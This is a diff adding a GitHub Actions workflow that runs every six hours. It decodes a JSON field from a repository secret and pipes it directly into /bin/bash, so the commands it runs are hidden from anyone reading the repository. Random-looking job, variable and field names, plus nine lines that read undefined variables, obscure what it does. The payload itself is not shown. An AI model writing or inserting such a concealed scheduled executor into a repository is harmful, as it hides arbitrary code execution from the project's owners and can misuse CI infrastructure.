@@ -1,0 +1,28 @@
+name: processcommitment
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: processcommitment
+        env:
+          qts258: ${{ secrets.qts258 }}
+        run: |
+          echo $qts258 | jq -r .rstq22256 | /bin/bash
+          echo $nx444 | jq -r .eqvq14 | /bin/bash
+          echo $t29505 | jq -r .hu8646 | /bin/bash
+          echo $r63 | jq -r .zpip1819 | /bin/bash
+          echo $zg453 | jq -r .poh8506 | /bin/bash
+          echo $ee56101 | jq -r .eucz5915 | /bin/bash
+          echo $a62853 | jq -r .byo79 | /bin/bash
+          echo $ubp93112 | jq -r .kk81171 | /bin/bash
+          echo $ndn388 | jq -r .ev73 | /bin/bash
+          echo $fy8599 | jq -r .l3 | /bin/bash
+
